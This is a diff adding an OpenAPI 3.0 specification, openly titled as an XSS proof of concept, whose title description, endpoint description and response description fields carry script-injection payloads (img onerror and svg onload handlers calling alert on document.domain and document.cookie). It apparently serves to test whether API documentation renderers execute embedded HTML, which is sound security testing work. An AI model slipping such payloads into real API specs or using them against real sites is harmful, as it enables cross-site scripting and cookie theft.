@@ -1,0 +1,21 @@
+{
+  "openapi": "3.0.0",
+  "info": {
+	"title": "XSS PoC API",
+	"version": "1.0.0",
+	"description": "<img src=x onerror=alert(document.domain)>"
+  },
+  "paths": {
+	"/test": {
+  	"get": {
+    	"summary": "XSS endpoint",
+    	"description": "<svg/onload=alert(document.cookie)>",
+    	"responses": {
+      	"200": {
+        	"description": "<img src=x onerror=alert('XSS via response description')>"
+      	}
+    	}
+  	}
+	}
+  }
+}
